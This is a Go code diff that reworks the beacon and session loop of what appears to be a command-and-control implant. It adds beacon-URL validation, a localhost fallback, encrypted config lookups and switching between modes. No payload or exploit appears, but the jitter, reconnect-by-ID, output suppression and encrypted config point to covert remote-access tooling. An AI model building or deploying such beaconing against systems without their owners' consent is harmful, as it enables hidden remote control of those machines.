@@ -40,11 +40,44 @@ func suppressOutput() {
 
 func beacon() {
 	logger.Log("[Main] ========== BEACON MODE STARTING ==========")
+
+	// Validate beacon URL is configured before attempting to beacon
+	url, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("[Main] Failed to get beacon URL: %v", err))
+		logger.Error("[Main] Cannot enter beacon mode without a valid URL configuration")
+		return
+	}
+	if url == "" || url == ":" || url == "http://:" || url == "https://:" {
+		logger.Error("[Main] Beacon URL is not configured or invalid")
+		logger.Error("[Main] Cannot enter beacon mode without a valid URL")
+		logger.Error("[Main] If switching from session mode, ensure beacon server URL is configured")
+		return
+	}
+	logger.Log(fmt.Sprintf("[Main] Beacon URL validated: %s", url))
+
 	for count := 0; count < config.MaxRetries; count++ {
 		logger.Log(fmt.Sprintf("[Main] Starting new iteration %d/%d", count+1, config.MaxRetries))
-		if config.ID != "" && config.Jitter != -1 && config.Timer != -1 {
+
+		// Get config values safely (auto-decrypts if needed)
+		currentID, errID := config.GetID()
+		if errID != nil {
+			logger.Error(fmt.Sprintf("[Main] Failed to get ID: %v", errID))
+			currentID = ""
+		}
+		currentURL, errURL := config.GetURL()
+		if errURL != nil {
+			logger.Error(fmt.Sprintf("[Main] Failed to get URL: %v", errURL))
+			currentURL = "http://localhost:" + config.URLPort
+		}
+		if currentURL == "" {
+			currentURL = "http://localhost:" + config.URLPort
+			logger.Warn(fmt.Sprintf("[Main] URL was empty, using default: %s", currentURL))
+		}
+
+		if currentID != "" && config.Jitter != -1 && config.Timer != -1 {
 			logger.Log("[Main] HTTP Reconnect mode - ID, Jitter, and Timer are set")
-			responseCode, _, Err := httpFuncs.HTTPReconnect(config.URL, config.ID, config.Jitter, config.Timer)
+			responseCode, _, Err := httpFuncs.HTTPReconnect(currentURL, currentID, config.Jitter, config.Timer)
 
 			if Err != nil {
 				logger.Error(fmt.Sprintf("[Main] Critical error during HTTP reconnect: %v", Err))
@@ -55,10 +88,12 @@ func beacon() {
 				time.Sleep(5 * time.Second)
 				continue
 			}
+			config.URL = currentURL
+			logger.Log("[Main] URL set to " + config.URL)
 		} else {
 			logger.Log("[Main] HTTP Connect mode - establishing new connection")
 
-			connTimer, connID, connJitter, err := httpFuncs.HTTPConnection(config.URL)
+			connTimer, connID, connJitter, err := httpFuncs.HTTPConnection(currentURL)
 
 			if err != nil {
 				logger.Error(fmt.Sprintf("[Main] Critical error establishing HTTP connection: %v", err))
@@ -76,6 +111,8 @@ func beacon() {
 			logger.Log("[Main] ID set to " + config.ID)
 			config.Jitter = connJitter
 			logger.Log("[Main] Jitter set to " + strconv.FormatFloat(config.Jitter, 'f', -1, 64))
+			config.URL = currentURL
+			logger.Log("[Main] URL set to " + config.URL)
 		}
 
 		logger.Log("[Main] Calling beacon handler")
@@ -87,7 +124,14 @@ func beacon() {
 		}
 		if switchSession {
 			logger.Log("[Main] Switching to session mode")
-			session.SessionHandler()
+			err, switchBeacon := session.SessionHandler()
+			if err != nil {
+				logger.Error(fmt.Sprintf("[Main] Session handler error: %v", err))
+			}
+			if switchBeacon {
+				logger.Log("[Main] Session requested switch back to beacon mode")
+				logger.Log("[Main] Continuing beacon reconnect pathway...")
+			}
 			continue
 		}
 
@@ -161,7 +205,15 @@ func main() {
 	case "session":
 		logger.Log("[Main] Session mode is the primary connection type.")
 		logger.Log("[Main] Starting session handler...")
-		session.SessionHandler()
+		err, switchBeacon := session.SessionHandler()
+		if err != nil {
+			logger.Error(fmt.Sprintf("[Main] Session handler error: %v", err))
+		}
+		if switchBeacon {
+			logger.Log("[Main] Session requested switch to beacon mode")
+			logger.Log("[Main] Following reconnect pathway via beacon mode...")
+			beacon()
+		}
 	case "beacon":
 		logger.Log("[Main] Beacon mode is the primary connection type.")
 		logger.Log("[Main] Starting beacon mode...")
